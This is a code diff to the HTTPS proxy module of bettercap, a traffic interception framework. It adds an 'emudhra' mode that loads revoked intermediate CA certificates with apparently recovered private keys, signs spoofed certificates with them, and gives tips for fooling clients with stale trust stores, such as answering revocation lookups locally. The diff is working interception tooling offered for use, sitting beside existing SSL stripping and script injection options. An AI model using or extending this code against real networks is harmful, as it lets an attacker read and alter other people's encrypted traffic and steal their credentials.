@@ -4,8 +4,8 @@ import (
 	"github.com/bettercap/bettercap/v2/modules/http_proxy"
 	"github.com/bettercap/bettercap/v2/session"
 	"github.com/bettercap/bettercap/v2/tls"
+	"github.com/bettercap/bettercap/v2/tls/emudhra"
 
-	"github.com/evilsocket/islazy/fs"
 	"github.com/evilsocket/islazy/str"
 )
 
@@ -49,18 +49,19 @@ func NewHttpsProxy(s *session.Session) *HttpsProxy {
 	mod.AddParam(session.NewStringParameter("https.proxy.certificate",
 		"~/.bettercap-ca.cert.pem",
 		"",
-		"HTTPS proxy certification authority TLS certificate file."))
+		"Proxy CA certificate for 'auto' mode, installed on the client; ignored in 'emudhra' mode."))
 
 	mod.AddParam(session.NewStringParameter("https.proxy.key",
 		"~/.bettercap-ca.key.pem",
 		"",
-		"HTTPS proxy certification authority TLS key file."))
+		"Proxy CA private key for 'auto' mode; ignored in 'emudhra' mode."))
 
 	mod.AddParam(session.NewIntParameter("https.proxy.leaf.bits",
 		"2048",
 		"Number of bits of the RSA private key of the spoofed per-host certificates. Values below 2048 are rejected by clients enforcing OpenSSL security level >= 2."))
 
 	tls.CertConfigToModule("https.proxy", &mod.SessionModule, tls.DefaultSpoofConfig)
+	tls.CAConfigToModule("https.proxy", &mod.SessionModule)
 
 	mod.AddParam(session.NewStringParameter("https.proxy.script",
 		"",
@@ -77,6 +78,19 @@ func NewHttpsProxy(s *session.Session) *HttpsProxy {
 		"Start HTTPS proxy.",
 		func(args []string) error {
 			return mod.Start()
+		}))
+
+	mod.AddHandler(session.NewModuleHandler("https.proxy.ca", "",
+		"List the compromised eMudhra intermediate CAs available in 'emudhra' mode.",
+		func(args []string) error {
+			if err := emudhra.Err(); err != nil {
+				return err
+			}
+			for _, ca := range emudhra.List() {
+				mod.Info("%-20s chain=%-6s key=%-3d sha256=%s",
+					ca.Name, ca.Chain, ca.KeyValue(), ca.SHA256)
+			}
+			return nil
 		}))
 
 	mod.AddHandler(session.NewModuleHandler("https.proxy off", "",
@@ -109,8 +123,6 @@ func (mod *HttpsProxy) Configure() error {
 	var httpPort int
 	var doRedirect bool
 	var scriptPath string
-	var certFile string
-	var keyFile string
 	var stripSSL bool
 	var jsToInject string
 	var whitelist string
@@ -129,14 +141,6 @@ func (mod *HttpsProxy) Configure() error {
 		return err
 	} else if err, stripSSL = mod.BoolParam("https.proxy.sslstrip"); err != nil {
 		return err
-	} else if err, certFile = mod.StringParam("https.proxy.certificate"); err != nil {
-		return err
-	} else if certFile, err = fs.Expand(certFile); err != nil {
-		return err
-	} else if err, keyFile = mod.StringParam("https.proxy.key"); err != nil {
-		return err
-	} else if keyFile, err = fs.Expand(keyFile); err != nil {
-		return err
 	} else if err, scriptPath = mod.StringParam("https.proxy.script"); err != nil {
 		return err
 	} else if err, jsToInject = mod.StringParam("https.proxy.injectjs"); err != nil {
@@ -152,24 +156,43 @@ func (mod *HttpsProxy) Configure() error {
 	mod.proxy.Blacklist = str.Comma(blacklist)
 	mod.proxy.Whitelist = str.Comma(whitelist)
 
-	if !fs.Exists(certFile) || !fs.Exists(keyFile) {
-		cfg, err := tls.CertConfigFromModule("https.proxy", mod.SessionModule)
+	caCfg, err := tls.CAConfigFromModule("https.proxy", mod.SessionModule)
+	if err != nil {
+		return err
+	}
+	caCfg.IsCA = true
+
+	if caCfg.IsEmudhra() {
+		ca, err := caCfg.Resolve()
 		if err != nil {
 			return err
 		}
-
-		mod.Debug("%+v", cfg)
-		mod.Info("generating proxy certification authority TLS key to %s", keyFile)
-		mod.Info("generating proxy certification authority TLS certificate to %s", certFile)
-		if err := tls.Generate(cfg, certFile, keyFile, true); err != nil {
+		if _, err := ca.Recover(); err != nil {
 			return err
 		}
+		mod.Warning("using revoked eMudhra CA %q (chain %s, recovered private key %d)", ca.Name, ca.Chain, ca.KeyValue())
+		mod.Warning("only clients with stale trust stores and no hard-fail CRL/OCSP or CT checks can be intercepted")
+		if ca.Chain == emudhra.ChainEmSign {
+			mod.Info("if the client only trusts AAA Certificate Services, try 'set https.proxy.ca.chain aaa'")
+		}
+		if err, m := mod.Session.Module("http.proxy"); err == nil && !m.Running() {
+			mod.Info("start 'http.proxy' too so CRL/OCSP lookups are answered locally")
+		}
+	} else if caCfg.FilesExist() {
+		mod.Info("loading proxy certification authority TLS key from %s", caCfg.KeyFile)
+		mod.Info("loading proxy certification authority TLS certificate from %s", caCfg.CertFile)
 	} else {
-		mod.Info("loading proxy certification authority TLS key from %s", keyFile)
-		mod.Info("loading proxy certification authority TLS certificate from %s", certFile)
+		mod.Debug("%+v", caCfg.Config)
+		mod.Info("generating proxy certification authority TLS key to %s", caCfg.KeyFile)
+		mod.Info("generating proxy certification authority TLS certificate to %s", caCfg.CertFile)
 	}
 
-	error := mod.proxy.ConfigureTLS(address, proxyPort, httpPort, doRedirect, scriptPath, certFile, keyFile, jsToInject,
+	ca, err := caCfg.Load()
+	if err != nil {
+		return err
+	}
+
+	error := mod.proxy.ConfigureTLS(address, proxyPort, httpPort, doRedirect, scriptPath, ca, jsToInject,
 		stripSSL, leafBits)
 
 	// save stripper to share it with other http(s) proxies
